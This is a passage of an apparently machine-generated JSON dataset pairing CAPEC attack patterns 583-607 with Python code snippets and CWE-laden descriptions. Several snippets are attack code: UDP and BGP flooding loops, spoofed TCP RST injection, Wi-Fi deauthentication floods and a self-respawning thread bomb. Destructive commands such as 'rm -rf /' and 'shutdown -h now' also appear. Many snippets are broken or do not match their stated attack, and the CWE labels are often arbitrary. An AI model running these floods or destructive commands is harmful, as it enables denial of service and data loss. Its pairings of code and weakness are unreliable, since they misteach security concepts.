while True:\n        pass\n\n# Example usage\ndisable_network_route('192.168.1.100', '192.168.1.200', 8080, 8080)\n",
        "description": "This code snippet demonstrates the CAPEC pattern of disabling a network route between two targets by exploiting various CWEs. It creates a socket object and binds it to a source IP and port, then injects errors into packets to disrupt the communication channel. The code also creates a thread to continuously send packets and flood the channel, causing a race condition. The network route is disabled by continuously sending packets, effectively severing the communication channel between the two targets."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n\n# Simulating hardware redundancy\nredundant_systems = ['system1', 'system2', 'system3']\n\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\n# Disabling critical system resources\nfor system in redundant_systems:\n    os.system(f'shutdown -h now {system}')\n    print(f'{system} has been shut down')\n    time.sleep(5)  # wait for 5 seconds\n\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n\n# Incorrectly connecting hardware child block to parent system\nparent_system = 'parent_system'\nhardware_child_block = 'hardware_child_block'\nos.system(f'connect {hardware_child_block} to {parent_system}')",
        "description": "This Python code snippet demonstrates the CAPEC attack pattern of physically disabling networking hardware by powering it down or disconnecting critical equipment. It uses related CWEs to show how an adversary can inject errors, improperly preserve hardware configuration state, and restrict software interfaces to hardware features. The code simulates hardware redundancy, disables critical system resources, and incorrectly connects a hardware child block to a parent system, leading to potential security risks."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\nimport threading\nimport time\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\ndef flood_bgp_route(route, as_number):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((route, 179))\n    while True:\n        sock.send(b'\\x01\\x02\\x00\\x1d\\x02\\x06\\x01\\x02\\x00\\x00\\x00\\x01\\x02\\x02\\x00\\x01\\x00\\x00\\x00\\x00')\n        time.sleep(0.01)\n\n# CWE-927: Use of Implicit Intent for Sensitive Communication\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef suppress_bgp_advertisement(as_number):\n    # Implicit intent to send sensitive data\n    threading.Thread(target=flood_bgp_route, args=(\"10.0.0.1\", as_number)).start()\n\n# Example usage\nsuppress_bgp_advertisement(12345)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a BGP router that can be exploited to suppress route advertisements and deny availability to a target network. The code includes several CWEs: CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-406 (Insufficient Control of Network Message Volume), CWE-927 (Use of Implicit Intent for Sensitive Communication), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-757 (Selection of Less-Secure Algorithm During Negotiation). The code floods a BGP route with malicious packets, suppressing the intended route advertisement and forcing less effective routes for traffic to the target Autonomous System (AS)."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nip_address = '192.0.2.1'\nhostname = socket.gethostbyaddr(ip_address)[0]\n\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\ncross_domain_policy = '<cross-domain-policy><allow-access-from domain=\"*\"/></cross-domain-policy>'\n\n# CWE-368: Context Switching Race Condition\ndef switch_context():\n    # Simulating a context switch\n    print('Switching context...')\n    # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    redirect_url = 'http://untrusted-site.com'\n    return redirect_url\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return '<html><body>' + user_input + '</body></html>'\n\n# Simulating the CAPEC attack\ndef disable_domain(domain):\n    # Send a request to the web-hosting company to disable the target domain\n    requests.post('https://web-hosting-company.com/disable-domain', data={'domain': domain})\n\n# Example usage\ndisable_domain('target-domain.com')",
        "description": "This code snippet demonstrates the CAPEC attack pattern where an adversary influences a target's web-hosting company to disable a target domain. The code includes vulnerabilities related to CWE-350, CWE-942, CWE-368, CWE-601, and CWE-79, which can be exploited to facilitate the attack."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\n\nclass User:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __getstate__(self):\n        return self.__dict__\n\n    def __setstate__(self, state):\n        self.__dict__.update(state)\n\n    def execute_command(self, command):\n        import os\n        os.system(command)\n\n# Vulnerable deserialization\nuser_data = b\"\\x80\\x03]q\\x00(K\\x01\\x85\\x01N\\x85\\x01X\\x0f\\x00\\x00\\x00username\\x00\\x00\\x00os\\x85\\x01X\\x0e\\x00\\x00\\x00password\\x00\\x00\\x00rm -rf /\n\" \nuser_obj = pickle.loads(user_data)\nuser_obj.execute_command('rm -rf /')",
        "description": "This Python code snippet demonstrates the CAPEC of deserialization of untrusted data, which can lead to arbitrary code execution. The User class has a method execute_command that executes a system command. An attacker can craft a malicious serialized object that, when deserialized, will execute a system command. The CWEs embodied in this code snippet are CWE-502 (Deserialization of Untrusted Data), CWE-77 (Improper Neutralization of Special Elements used in a Command), and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "import requests\n\n# CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n# CWE-692: Incomplete Denylist to Cross-Site Scripting\n# CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page\n# CWE-352: Cross-Site Request Forgery (CSRF)\n\n# Malicious JavaScript code to be injected\nmalicious_js = '<script>document.body.innerHTML += \\'<iframe src=\\",
        "description": "This code snippet demonstrates a CAPEC attack that combines malicious JavaScript with a legitimate webpage loaded into a concealed iframe. The malicious JavaScript interacts with the legitimate webpage in a manner unknown to the user, leveraging social engineering to convince the user to visit the malicious webpage. The code exploits CWE-1021, CWE-79, CWE-692, CWE-82, and CWE-352 vulnerabilities."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    html = '<div id=\"result\">Search results for ' + query + ':</div>'\n    return html\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to DOM-based Cross-Site Scripting (XSS). The 'search' function retrieves a user-input 'query' parameter and injects it into the HTML response without proper validation or output encoding, allowing an attacker to inject malicious script code that can manipulate the Document Object Model (DOM) of the page. This code embodies CWE-79, CWE-20, CWE-83, CWE-82, and CWE-80."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\ndef drop_dns_request(ip_address, hostname):\n    # CWE-300: No verification of the identity of actors at both ends of the communication channel\n    # CWE-291: Using IP address for authentication\n    if ip_address == '192.168.1.100':\n        return False\n    \n    # CWE-350: Relying on reverse DNS resolution for a security-critical action\n    try:\n        host = socket.gethostbyaddr(ip_address)[0]\n        if host != hostname:\n            return False\n    except socket.herror:\n        return False\n    \n    # CWE-1327: Binding to an unrestricted IP address\n    # CWE-412: Unrestricted externally accessible lock\n    if ip_address == '0.0.0.0':\n        return False\n    \n    return True\n\n# Example usage\nip_address = '192.168.1.100'\nhostname = 'example.com'\nif not drop_dns_request(ip_address, hostname):\n    print('DNS request dropped')",
        "description": "This code snippet demonstrates a vulnerable DNS request handler that can be exploited by an adversary to deny the availability of specific services or content to the user. The handler relies on IP address for authentication, performs reverse DNS resolution for security-critical actions, binds to an unrestricted IP address, and has an unrestricted externally accessible lock. An adversary can intercept traffic and intentionally drop DNS requests based on content in the request, making it vulnerable to the described CAPEC."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-1327: Binding to an Unrestricted IP Address\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\ndef drop_packets(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.bind((\"0.0.0.0\", 0))  # Binding to 0.0.0.0, allowing access from anywhere\n    while True:\n        packet = sock.recvfrom(1024)\n        if packet[1][0] == target_ip:\n            # Drop packets destined for the target IP address\n            continue\n        else:\n            # Process packets from other IP addresses\n            process_packet(packet)\n\n# Example usage:\n# drop_packets(\"192.168.1.100\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation that drops packets destined for a target IP address, effectively preventing access to a service hosted at that IP address. It uses a raw socket to receive packets and binds to 0.0.0.0, allowing access from anywhere. The code relies on IP addresses for authentication and does not properly ensure the integrity of the communication channel, making it vulnerable to various attacks."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = flask.request.args.get('query')\n    return '<h1>Search Results for ' + query + '</h1>'\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to Reflected Cross-Site Scripting (XSS). The 'search' function retrieves a 'query' parameter from the URL and injects it into the HTML response without proper sanitization, allowing an attacker to inject malicious scripts. This code embodies CWE-79, CWE-82, CWE-692, CWE-84, and CWE-81, as it fails to neutralize user-controllable input, allowing XSS attacks to succeed."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    comment = flask.request.form['comment']\n    db = {'comments': []}\n    db['comments'].append(comment)\n    return 'Comment added!'\n\n@app.route('/comments')\ndef get_comments():\n    html = '<html><body>'\n    for comment in db['comments']:\n        html += '<p>' + comment + '</p>'\n    html += '</body></html>'\n    return html\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to Stored Cross-Site Scripting (XSS). The application allows users to add comments, which are stored in a database. When displaying the comments, the application does not properly sanitize the input, allowing an attacker to inject malicious scripts. The code violates CWE-79 by not neutralizing user-controllable input, CWE-692 by using an incomplete denylist, CWE-1289 by not validating input equivalence, CWE-82 by not neutralizing script in IMG tag attributes, and CWE-85 by not filtering user-controlled input for executable scripts."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "import uuid\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, username):\n        session_id = uuid.uuid4().hex[:8]  # CWE-6: Insufficient Session-ID Length\n        self.sessions[session_id] = username\n        return session_id\n\n    def authenticate(self, session_id):\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        else:\n            return None\n\n    def invalidate_session(self, session_id):\n        if session_id in self.sessions:\n            del self.sessions[session_id]\n\n# CWE-287: Improper Authentication\n# CWE-384: Session Fixation\n# CWE-613: Insufficient Session Expiration\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\nmanager = SessionManager()\n\nusername = 'user'\npassword = 'password'\n\nif username == 'user' and password == 'password':\n    session_id = manager.create_session(username)\n    print('Authenticated. Session ID:', session_id)\nelse:\n    print('Invalid credentials')\n\n# Attack scenario:\n# An attacker steals the session ID and uses it to authenticate\nstolen_session_id = session_id\nprint('Authenticated using stolen session ID:', manager.authenticate(stolen_session_id))",
        "description": "This code snippet demonstrates a vulnerable session management system that is susceptible to session fixation, insufficient session expiration, and improper authentication. The session ID is generated with an insufficient length, and the system does not properly invalidate existing sessions. An attacker can steal a valid session ID and use it to gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\ndef send_unverified_data():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 8080))\n    data = b'inject_data_here'\n    sock.send(data)\n    sock.close()\n\n\ndef receive_unverified_data():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8080))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    data = conn.recv(1024)\n    # No verification of source or integrity of data\n    process_data(data)\n    conn.close()\n\n\ndef process_data(data):\n    # No control of network message volume\n    for i in range(1000):\n        send_unverified_data()\n\n    # Cleartext transmission of sensitive information\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 8080))\n    sock.send(b'sensitive_data')\n    sock.close()\n\n    # Improper control of resource identifiers\n    resource_id = data.decode('utf-8')\n    # Use resource_id as an identifier for a resource without restriction\n    open(resource_id, 'w').write('malicious_data')\n",
        "description": "This code snippet demonstrates the CAPEC of injecting traffic into a target's network connection. The `send_unverified_data` function sends unverified data to a server, and the `receive_unverified_data` function receives and processes the data without verifying its source or integrity. The `process_data` function lacks control of network message volume, transmits sensitive information in cleartext, and uses unverified input as a resource identifier."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport struct\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-605: Multiple Binds to the Same Port\n\ndef inject_reset_packet(src_ip, dst_ip, src_port, dst_port):\n    # Create a raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n    # CWE-605: Multiple Binds to the Same Port\n    # Bind to the same port as the target connection\n    s.bind((src_ip, src_port))\n\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Create a TCP reset packet with spoofed source IP and port\n    packet = bytearray([0x45, 0x00, 0x00, 0x28, 0x00, 0x00, 0x40, 0x00, 0x06, 0x00, 0x00, 0x00])\n    packet += socket.inet_aton(src_ip)\n    packet += socket.inet_aton(dst_ip)\n    packet += struct.pack('!HHLLHHHH', src_port, dst_port, 0, 0, 0x5014, 0, 0, 0x0000)\n    packet += struct.pack('!H', 0x0004)  # RST flag\n\n    # CWE-294: Authentication Bypass by Capture-replay\n    # Send the spoofed reset packet to the target connection\n    s.sendto(packet, (dst_ip, dst_port))\n\n# Example usage\ninject_reset_packet('192.168.1.100', '192.168.1.200', 8080, 8080)\n",
        "description": "This Python code snippet demonstrates the CAPEC attack pattern by injecting a connection reset packet to one or both ends of a target's connection. The code creates a raw socket, binds to the same port as the target connection, and sends a spoofed TCP reset packet with the RST flag set. This can cause the target and/or destination server to sever the connection without having to directly filter the traffic between them."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\nimport threading\nimport time\n\ndef send_RST_packet(dst_ip, dst_port, src_ip, src_port, seq_num, ack_num):\n    rst_packet = bytearray(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x04\\x00\\x00\\x40\\x00\\x00\\x00')\n    rst_packet[0:2] = (src_port).to_bytes(2, byteorder='big')\n    rst_packet[2:4] = (dst_port).to_bytes(2, byteorder='big')\n    rst_packet[4:6] = (seq_num).to_bytes(2, byteorder='big')\n    rst_packet[6:8] = (ack_num).to_bytes(2, byteorder='big')\n    rst_packet[8] = 0x14\n    rst_packet[9] = 0x00\n    rst_packet[12] = 0x00\n    rst_packet[13] = 0x04\n    rst_packet[14] = 0x02\n    rst_packet[15] = 0x04\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.sendto(rst_packet, (dst_ip, dst_port))\n\ndef main():\n    dst_ip = '192.168.1.100'\n    dst_port = 80\n    src_ip = '192.168.1.101'\n    src_port = 1234\n    seq_num = 123456789\n    ack_num = 234567890\n    send_RST_packet(dst_ip, dst_port, src_ip, src_port, seq_num, ack_num)\n\ndef start_thread():\n    threading.Thread(target=main).start()\n    time.sleep(1)\n    start_thread()\nstart_thread()",
        "description": "This Python code snippet demonstrates a TCP RST packet injection attack, which can be used to terminate a TCP connection. The code creates a TCP RST packet with spoofed source IP and port, and sends it to the target server. This can be used to exploit vulnerabilities such as CWE-940 (Improper Verification of Source of a Communication Channel), CWE-918 (Server-Side Request Forgery), CWE-294 (Authentication Bypass by Capture-replay), CWE-444 (Inconsistent Interpretation of HTTP Requests), and CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(file_path, 'r').read()\n\nfile_path = input('Enter file path: ')\nprint(read_file(file_path))",
        "description": "This Python code snippet demonstrates the vulnerability of Path Traversal. The function read_file() takes a file path as input and reads the contents of the file. The file path is provided by the user through the input() function, which makes it vulnerable to Path Traversal attacks. An attacker can provide a path like '../../../../etc/passwd' to access sensitive files outside of the intended directory."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import socket\nimport dns.resolver\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nip_address = '192.168.1.1'\nhostname = socket.gethostbyaddr(ip_address)[0]\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndns_resolver = dns.resolver.Resolver()\nanswer = dns_resolver.query(hostname, 'A')\n\n# CWE-494: Download of Code Without Integrity Check\nmalicious_dns_response = '192.168.1.2'\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nredirect_url = 'http://example.com/malicious_code'\n\n# CWE-918: Server-Side Request Forgery (SSRF)\nssrf_url = 'http://example.com/malicious_code?ip_address=' + ip_address\n\n# Malicious DNS response\nprint('NXDOMAIN response:', malicious_dns_response)\n",
        "description": "Python code snippet demonstrating a DNS spoofing attack, exploiting CWE-350, CWE-941, CWE-494, CWE-601, and CWE-918. The code sends a malicious DNS response to a target's route request, redirecting it to a malicious site."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\nimport json\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef send_sensitive_data():\n    # Establish a communication channel without proper endpoint verification\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('satellite-dish-ip', 8080))\n\n    # CWE-927: Use of Implicit Intent for Sensitive Communication\n    # Use an implicit intent to transmit sensitive data\n    data = {'credit_card_number': '1234-5678-9012-3456', 'expiration_date': '2025-12-31'}\n    json_data = json.dumps(data)\n\n    # CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    # Overlap protected and unprotected regions in the address map\n    overlapped_data = json_data + 'unprotected_data'\n\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    # Transmit sensitive data in cleartext\n    sock.sendall(overlapped_data.encode())\n\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # Receive a message without verifying its integrity\n    received_data = sock.recv(1024)\n    print(received_data.decode())\n\nsend_sensitive_data()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that embodies the main idea of the CAPEC. It establishes a connection to a satellite dish IP without proper endpoint verification, transmits sensitive data in cleartext, and overlaps protected and unprotected regions in the address map. The code also uses an implicit intent for sensitive communication and receives data without verifying its integrity."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-522: Insufficiently Protected Credentials\n    # Storing passwords in plaintext\n    users = {\n        'user1': 'password123',\n        'user2': 'qwerty',\n        'admin': 'letmein'\n    }\n\n    # CWE-307: Improper Restriction of Excessive Authentication Attempts\n    # No rate limiting or IP blocking for failed attempts\n    if username in users and users[username] == password:\n        return True\n    else:\n        return False\n\n# CWE-308: Use of Single-factor Authentication\n# No 2FA or MFA implemented\n# CWE-309: Use of Password System for Primary Authentication\n# Passwords are used as the primary means of authentication\n# CWE-262: Not Using Password Aging\n# No password aging mechanism in place\n# CWE-263: Password Aging with Long Expiration\n# No expiration period for passwords\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# Authentication relies solely on username and password\n\nusername = input('Enter username: ')\npassword = input('Enter password: ')\nif authenticate(username, password):\n    print('Authenticated successfully!')\nelse:\n    print('Invalid credentials.')",
        "description": "A Python code snippet that demonstrates a vulnerable authentication system, susceptible to credential stuffing attacks due to the use of insecure practices such as storing passwords in plaintext, lack of rate limiting, and reliance on single-factor authentication."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\nimport random\nimport string\n\n\ndef flood_target(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    while True:\n        sock.sendto(''.join(random.choice(string.printable) for _ in range(1024)), (ip, port))\n\n\ndef main():\n    ip = '10.0.0.1'\n    port = 12345\n    threads = []\n    for _ in range(100):\n        t = threading.Thread(target=flood_target, args=(ip, port))\n        t.start()\n        threads.append(t)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a denial-of-service (DoS) attack by flooding a target IP and port with random UDP packets. The code creates 100 threads, each sending 1024 bytes of random data to the target, overwhelming the system resources and denying service to legitimate users. This code embodies the CAPEC description and relates to CWEs 924, 406, 923, 319, and 421, as it does not ensure message integrity, allows for network amplification, does not restrict communication channels, transmits sensitive information in cleartext, and is vulnerable to race conditions."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import pickle\n\ndef authenticate(username, password):\n    # CWE-592: Authentication Bypass Issues\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n\ndef load_config():\n    # CWE-477: Use of Obsolete Function\n    # CWE-545: DEPRECATED: Use of Dynamic Class Loading\n    config = pickle.load(open('config.pkl', 'rb'))\n    return config\n\n\ndef get_ip_address(hostname):\n    # CWE-247: DEPRECATED: Reliance on DNS Lookups in a Security Decision\n    import socket\n    return socket.gethostbyname(hostname)\n\n\ndef modify_data(data):\n    # CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n    data['key'] = 'new_value'\n    return data\n",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern that incorporates multiple weaknesses. It includes an authentication function with a hardcoded password, use of the obsolete pickle.load function, reliance on DNS lookups for security decisions, and failure to protect stored data from modification."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import socket\nimport threading\n\nclass UnlimitedSocketAllocator:\n    def __init__(self):\n        self.sockets = {}\n\n    def allocate_socket(self, client_id):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sockets[client_id] = sock\n        return sock\n\n    def handle_client(self, client_id):\n        while True:\n            sock = self.allocate_socket(client_id)\n            sock.connect(('localhost', 8080))\n            sock.send(b'Hello, server!')\n            sock.recv(1024)\n\nallocator = UnlimitedSocketAllocator()\n\nfor i in range(10000):\n    t = threading.Thread(target=allocator.handle_client, args=(i,))\n    t.start()",
        "description": "This code snippet demonstrates the CAPEC of blocking the delivery of an important system resource, causing the system to fail or stop working. It creates an UnlimitedSocketAllocator class that allocates a new socket for each client connection without any limits or throttling (CWE-770), leading to uncontrolled resource consumption (CWE-400). The allocate_socket method does not properly control the allocation and maintenance of the socket resource, allowing an attacker to exhaust the available resources. Additionally, the creation of a new socket for each client connection can be considered as creating an emergent resource (CWE-1229) that can be used by attackers to degrade the system. If the system has hardware redundancy, an unauthorized agent can inject errors into the redundant block to deprive the system of redundancy or put the system in a degraded operating mode (CWE-1334)."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import scapy\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a rogue Wi-Fi access point\nap_mac = '00:11:22:33:44:55'\nclient_mac = '66:77:88:99:00:11'\n\n# CWE-421: Race Condition During Access to Alternate Channel\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Send deauthentication frames to flood the Wi-Fi access point\npkt = scapy.Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac)\npkt /= scapy.Dot11Deauth(reason=7)\nscapy.sendp(pkt, iface='wlan0', count=1000, inter=0.1)\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a rogue Wi-Fi client to transmit high levels of noise on the RF band\nclient = scapy.Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac)\nnoise_pkt = client / scapy.RadioTap() / scapy.Dot11QoS()\nscapy.sendp(noise_pkt, iface='wlan0', count=1000, inter=0.1)\n",
        "description": "Python code snippet demonstrating a Wi-Fi jamming attack by flooding the Wi-Fi access point with deauthentication frames and transmitting high levels of noise on the RF band, exploiting CWE-924, CWE-923, CWE-940, CWE-421, and CWE-319."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\nimport random\nimport time\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Establish a socket to the cell tower\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Simulate high levels of noise on signaling channels\nwhile True:\n    # Send false status messages to overwhelm the cell tower\n    sock.send(b'false_status_message')\n    time.sleep(random.uniform(0.1, 1.0))\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# Send sensitive information in cleartext\nsock.send(b'sensitive_info')\n",
        "description": "This Python code snippet demonstrates a CAPEC attack scenario where an attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. The code establishes a socket to the cell tower, simulates high levels of noise on signaling channels, sends false status messages to overwhelm the cell tower, and transmits sensitive information in cleartext, violating CWE-300, CWE-940, CWE-924, CWE-319, and CWE-1300."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import socket\nimport hashlib\n\ndef negotiate_algorithm(client_socket, available_algorithms):\n    # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n    # The client and server negotiate the encryption algorithm to use.\n    # In this example, the client suggests a weak algorithm (A5/1) and the server accepts it.\n    suggested_algorithm = 'A5/1'\n    client_socket.send(suggested_algorithm.encode())\n    response = client_socket.recv(1024).decode()\n    if response == 'accepted':\n        print('Using A5/1 encryption')\n        # CWE-326: Inadequate Encryption Strength\n        # A5/1 is a weak encryption algorithm\n        key = 'hardcoded_key'  # CWE-321: Use of Hard-coded Cryptographic Key\n        cipher = hashlib.md5(key.encode()).digest()\n        return cipher\n    else:\n        print('Failed to negotiate algorithm')\n        return None\n\ndef transmit_data(client_socket, cipher):\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # The client transmits data without ensuring its integrity during transmission.\n    data = 'sensitive_data'\n    encrypted_data = xor_encrypt(data, cipher)\n    client_socket.send(encrypted_data.encode())\n\ndef xor_encrypt(data, cipher):\n    # CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    # The xor_encrypt function uses a simple XOR operation for encryption, which is a broken algorithm.\n    encrypted_data = ''.join([chr(ord(c) ^ ord(k)) for c, k in zip(data, cipher)])\n    return encrypted_data\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nclient_socket, address = server_socket.accept()\n\n# Negotiate the encryption algorithm\ncipher = negotiate_algorithm(client_socket, ['A5/0', 'A5/1', 'A5/2'])\nif cipher:\n    # Transmit sensitive data\n    transmit_data(client_socket, cipher)\n",
        "description": "This code snippet demonstrates the CAPEC of an attacker forcing a mobile device to use a weak encryption algorithm (A5/1) or no encryption at all. The code includes CWEs such as selection of a less-secure algorithm during negotiation, inadequate encryption strength, improper enforcement of message integrity during transmission, use of a hard-coded cryptographic key, and use of a broken or risky cryptographic algorithm."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import os\nimport time\n\n# CWE-693: Protection Mechanism Failure\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n\n# Simulating a redundant system with two components\ncomponent1_status = True\ncomponent2_status = True\n\nwhile True:\n    # CWE-653: Improper Isolation or Compartmentalization\n    # No proper isolation between components\n    if component1_status and component2_status:\n        print(\"System is fully operational\")\n    elif not component1_status and component2_status:\n        print(\"Component 1 is down, system is in degraded mode\")\n    elif component1_status and not component2_status:\n        print(\"Component 2 is down, system is in degraded mode\")\n    else:\n        print(\"System is unavailable\")\n\n    # CWE-1332: Improper Handling of Faults that Lead to Instruction Skips\n    # Simulating a fault that leads to instruction skips\n    if os.urandom(1) == b'\\x00':\n        print(\"Fault detected, skipping critical instructions\")\n        time.sleep(1)\n        continue\n\n    # CWE-1298: Hardware Logic Contains Race Conditions\n    # Simulating a race condition in hardware logic\n    if 